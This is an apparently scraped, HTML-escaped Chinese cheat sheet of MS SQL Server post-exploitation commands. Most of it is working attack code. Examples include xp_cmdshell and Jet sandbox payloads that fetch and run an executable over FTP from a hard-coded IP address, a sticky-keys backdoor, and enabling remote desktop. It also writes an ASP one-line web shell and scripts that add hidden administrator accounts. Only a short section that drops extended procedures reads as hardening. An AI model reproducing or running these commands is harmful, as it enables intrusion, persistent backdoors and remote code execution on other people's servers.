shell(&quot;cmd.exe &#x2F;c @echo open 60.190.176.85&gt;&gt;net.txt&amp;@echo reconditeness&gt;&gt;net.txt&amp;@echo 7259&gt;&gt;net.txt&amp;@echo get 0.exe&gt;&gt;net.txt&amp;@echo bye&gt;&gt;net.txt&amp;@ftp -s:net.txt&amp;del net.txt &amp; 0.exe&quot;)’)<br /><br />win03-XP直接上PS马<br />exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,1<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;cmd.exe &#x2F;c @echo open 60.190.176.85&gt;&gt;net.txt&amp;@echo reconditeness&gt;&gt;net.txt&amp;@echo 7259&gt;&gt;net.txt&amp;@echo get 0.exe&gt;&gt;net.txt&amp;@echo bye&gt;&gt;net.txt&amp;@ftp -s:net.txt&amp;del net.txt &amp; 0.exe&quot;)’)<br /><br />shift后门命令<br />declare @o int<br />exec sp_oacreate ‘scripting.filesystemobject’, @o out<br />exec sp_oamethod @o, ‘copyfile’,null,’c:windowsexplorer.exe’ ,’c:windowssystem32sethc.exe’;<br />declare @o int<br />exec sp_oacreate ‘scripting.filesystemobject’, @o out<br />exec sp_oamethod @o, ‘copyfile’,null,’c:windowssystem32sethc.exe’ ,’c:windowssystem32dllcachesethc.exe’;<br />copy c:windowsexplorer.exe c:windowssystem32sethc.exe<br />copy c:windowssystem32sethc.exe c:windowssystem32dllcachesethc.exe<br /><br />declare @o int<br />exec sp_oacreate ‘wscript.shell’, @o out<br />exec sp_oamethod @o, ‘run’, NULL, ‘XXXXX’ XXXXX为你要执行的命令<br /><br /><br />开3389<br />REG ADD HKLMSYSTEMCurrentControlSetControlTerminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<br /><br />SQL写一句话<br />exec master.dbo.xp_subdirs ‘d:webcdlxkj’;<br />exec sp_makewebtask ‘d:webcdlxkjXX.asp’,’select’’&lt;%execute(request(&quot;SB&quot;))%&gt;’’ ‘<br />SA沙盒模式提权—–<br />———————-<br />exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,0;<br />——————————————————-<br />Select * From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;net user sql$ 123 &#x2F;add&quot;)’);<br />——————————————————-<br />Select * From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;net localgroup administrators sql$ &#x2F;add&quot;)’);<br /><br />SHIFT<br />入侵<br />EXEC master..xp_regwrite<br />@rootkey&#x3D;’HKEY_LOCAL_MACHINE’,<br />@key&#x3D;’SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.EXE’,<br />@value_name&#x3D;’Debugger’,<br />@type&#x3D;’REG_SZ’,<br />@value&#x3D;’C:WINDOWSexplorer.exe’<br />整个过程是利用master..xp_regwrite这组件来完成的,<br /><br />1.sql命令查询注册表粘滞键是否被劫持<br />exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe’,’Debugger’<br />2.sql命令劫持注册表粘滞键功能,替换成任务管理器(当然你也可以替换成你想要的其他命令)<br />xp_regwrite ‘HKEY_LOCAL_MACHINE’, ‘SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe’,<br />‘Debugger’,’REG_SZ’,’C:WINDOWSsystem32taskmgr.exe’<br />3.sql命令删除注册表粘滞键的劫持功能保护你的服务器不再被他人利用<br />xp_regdeletekey ‘HKEY_LOCAL_MACHINE’, ‘SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe’<br /><br />sql写文件<br />declare @o int, @f int, @t int, @ret int<br />exec sp_oacreate ‘scripting.filesystemobject’, @o out<br />exec sp_oamethod @o, ‘createtextfile’, @f out, ‘c:1.vbs’, 1<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’set wsnetwork&#x3D;CreateObject(&quot;WSCRIPT.NETWORK&quot;)’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’os&#x3D;&quot;WinNT:&#x2F;&#x2F;&quot;&amp;wsnetwork.ComputerName’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’Set ob&#x3D;GetObject(os)’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’Set oe&#x3D;GetObject(os&amp;&quot;&#x2F;Administrators,group&quot;)’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’Set od&#x3D;ob.Create(&quot;user&quot;,&quot;test&quot;)’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’od.SetPassword &quot;1234&quot;’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’od.SetInfo ‘<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’Set of&#x3D;GetObject(os&amp;&quot;&#x2F;test&quot;,user) ‘<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’oe.add os&amp;&quot;&#x2F;test&quot;’<br />exec master..xp_cmdshell ‘cscript c:1.vbs’<br /><br />无NET提权的脚本<br />struser&#x3D;wscript.arguments(0)<br />strpass&#x3D;wscript.arguments(1)<br />set lp&#x3D;createObject(&quot;WSCRIPT.NETWORK&quot;)<br />oz&#x3D;&quot;WinNT:&#x2F;&#x2F;&quot;&amp;lp.ComputerName<br />Set ob&#x3D;GetObject(oz)<br />Set oe&#x3D;GetObject(oz&amp;&quot;&#x2F;Administrators,group&quot;)<br />Set od&#x3D;ob.create(&quot;user&quot;,struser)<br />od.SetPassword strpass<br />od.SetInfo<br />Set of&#x3D;GetObject(oz&amp;&quot;&#x2F;&quot; &amp; struser &amp; &quot;,user&quot;)<br />oe.Add(of.ADsPath)<br />For Each admin in oe.Members<br />if struser&#x3D;admin.Name then<br />Wscript.echo struser &amp; &quot; 建立成功!&quot;<br />wscript.quit<br />end if<br />Next<br />Wscript.echo struser &amp; &quot; 用户建立失败!&quot;<br />将以上保存为user.VBS文件<br />然后执行：cscript user.vbs 用户名 密码<br /><br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />恢复xp_cmdshell<br />exec sp_dropextendedproc ‘xp_cmdshell’<br />EXEC sp_addextendedproc xp_cmdshell,@dllname &#x3D;’xplog70.dll’declare @o int<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />开启xp_cmdshell<br />USE master<br />EXEC sp_configure ‘show advanced options’, 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure ‘xp_cmdshell’, 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure ‘show advanced options’, 0<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />开启Automation Procedures<br />USE master<br />EXEC sp_configure ‘show advanced options’, 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure ‘Ole Automation Procedures’,1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configur<br>e ‘show advanced options’, 0<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />开启Distributed Queries<br />USE master<br />EXEC sp_configure ‘show advanced options’, 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure ‘Ad Hoc Distributed Queries’,1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure ‘show advanced options’, 0<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />恢复Xp_regwrite<br />EXEC sp_dropextendedproc ‘Xp_regwrite’<br />exec sp_addextendedproc xp_regwrite,’xpstar.dll’<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />恢复sp_OACreate<br />dbcc addextendedproc (&quot;sp_OACreate&quot;,&quot;odsole70.dll&quot;)<br />exec sp_addextendedproc sp_OAMethod,’odsole70.dll’<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />cmdshell开3389<br />exec master..xp_cmdshell ‘echo Windows Registry Editor Version 5.00&gt;c:3389.reg’<br />exec master..xp_cmdshell ‘echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server]&gt;&gt;c:3389.reg’<br />exec master..xp_cmdshell ‘echo &quot;fDenyTSConnections&quot;&#x3D;dword:00000000&gt;&gt;c:3389.reg’<br />exec master..xp_cmdshell ‘regedit &#x2F;s c:3389.reg’<br />exec master..xp_cmdshell ‘del c:3389.reg’<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />cmdshell添加用户<br />insert resultcmd_cc exec master..xp_cmdshell ‘net user 用户 密码 &#x2F;add’<br />insert resultcmd_cc exec master..xp_cmdshell ‘net user 用户 密码’<br />insert resultcmd_cc exec master..xp_cmdshell ‘net user 用户 &#x2F;active:yes’<br />insert resultcmd_cc exec master..xp_cmdshell ‘net localgroup administrators 用户 &#x2F;add’<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />oacreate添加用户<br />DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out<br />EXEC sp_oamethod @s,[run], NULL, [net user support$ support &#x2F;add]<br />EXEC sp_oamethod @s,[run], NULL, [net localgroup administrators support &#x2F;add]<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />regwrite添加用户<br />Exec master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,0<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;iasdnary.mdb’,’select shell(&quot;net user 用户 密码 &#x2F;add&quot;)’)<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;iasdnary.mdb’,’select shell(&quot;net localgroup administrators 用户 &#x2F;add&quot;)’)<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />cmdshell模式FTP下载:<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c echo open FTP地址&gt;sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c echo 123 &gt;&gt;sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c echo 123 &gt;&gt;sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c echo get 1433.exe sly.exe&gt;&gt;sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c echo bye &gt;&gt;sly.sys]’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c ftp -s:sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c del sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c sly.exe’<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />oacreate模式FTP下载:<br />DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c echo open FTP地址&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c echo 123 &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c echo 123 &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c echo get 1433.exe sly.exe&gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c echo bye &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c ftp -s:sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c del sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c sly.exe]<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />不需要XP_CMDSHLL执行CMD命令<br />exec master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,1<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:winntsystem32iasias.mdb’,’select shell(&quot;cmd.exe &#x2F;c net user 用户 密码 &#x2F;add.&quot;)’)<br />exec master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,1<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:winntsystem32iasias.mdb’,’select shell(&quot;cmd.exe &#x2F;c net localgroup administrators 用户 &#x2F;add.&quot;)’)<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />SQL Server 阻止了对组件 ‘Ole Automation Procedures’ 的 过程’sys.sp_OACreate’ 的访问<br />sp_configure ‘show advanced options’, 1;<br />GO<br />RECONFIGURE;<br />GO<br />sp_configure ‘Ole Automation Procedures’, 1;<br />GO<br />RECONFIGURE;<br />GO<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />错误5是个系统提示的错误号，CreateProcess这个是创建线程的意思，这个错误产生和系统文件cmd.exe有很大的关系，一种情况是cmd被删除，一种是cmd的权限被降低了.<br />SQL查看终端端口及开放情况：<br />exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp’,’PortNumber’<br />好了，下面关键的地方了，要用到两条sql指令，将系统的explorer文件复制为系统的shift后门文件，下面两条语句为分别执行的，不可以放在一起执行，我是在sql tools 2.0工具里执行的，你也可以在分离器中执行，记得分别执行。<br />&#x2F;&#x2F;这条语句将explorer.exe复制为sethc.exe<br />declare @o int exec sp_oacreate ‘scripting.filesystemobject’, @o out exec sp_oamethod @o, ‘copyfile’,null,’c:windowsexplorer.exe’,’c:windowssystem32sethc.exe’;<br />&#x2F;&#x2F;这条语句将sethc.exe复制到dllcache目录下<br />declare @oo int exec sp_oacreate ‘scripting.filesystemobject’, @oo out exec sp_oamethod @oo, ‘copyfile’,null,’c:windowssystem32sethc.exe’,’c:windowssystem32dllcachesethc.exe’;<br />这个两条语句执行的时间间隔最好不超过10秒钟，否则系统会自动恢复原来的文件。<br />另外这两条语句使用到的sp_oacreate存储过程需要使用到odsole70.dll这个文件，所以这个文件的存亡，关系到创建的成功与否。<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />删除：<br />use master<br />exec sp_dropextendedproc ‘xp_cmdshell’<br />exec sp_dropextendedproc ‘xp_dirtree’<br />exec sp_dropextendedproc ‘xp_enumgroups’<br />exec sp_dropextendedproc ‘xp_fixeddrives’<br />exec sp_dropextendedproc ‘xp_loginconfig’<br />exec sp_dropextendedproc ‘xp_enumerrorlogs’<br />exec sp_dropextendedproc ‘xp_getfiledetails’<br />exec sp_dropextendedproc ‘Sp_OACreate’<br />exec sp_dropextendedproc ‘Sp_OADestroy’<br />exec sp_dropextendedproc ‘Sp_OAGetErrorInfo’<br />exec sp_dropextendedproc ‘Sp_OAGetProperty’<br />exec sp_dropextendedproc ‘Sp_OAMethod’<br />exec sp_dropextendedproc ‘Sp_OASetProperty’<br />exec sp_dropextendedproc ‘Sp_OAStop’<br />exec sp_dropextendedproc ‘Xp_regaddmultistring’<br />exec sp_dropextendedproc ‘Xp_regdeletekey’<br />exec sp_dropextendedproc ‘Xp_regdeletevalue’<br />exec sp_dropextendedproc ‘Xp_regenumvalues’<br />exec sp_dropextendedproc ‘Xp_regread’<br />exec sp_dropextendedproc ‘Xp_regremovemultistring’<br />exec sp_dropextendedproc ‘Xp_regwrite’<br />drop procedure sp_makewebtask<br />go<br />———————————————————————————-<br />———————-<br />–列出当前计算机名称–<br />———————-<br />execute master..xp_getnetname<br />——————————–<br />-列出当前计算机的驱动器可用空间-<br />——————————–<br />execute master..xp_fixeddrives<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />&#x3D;&#x3D;列出服务器所有本地组&#x3D;&#x3D;<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br><br />execute master..xp_enumgroups<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />&#x3D;&#x3D;获取MS SQL的版本号&#x3D;&#x3D;<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />execute master..sp_msgetversion<br 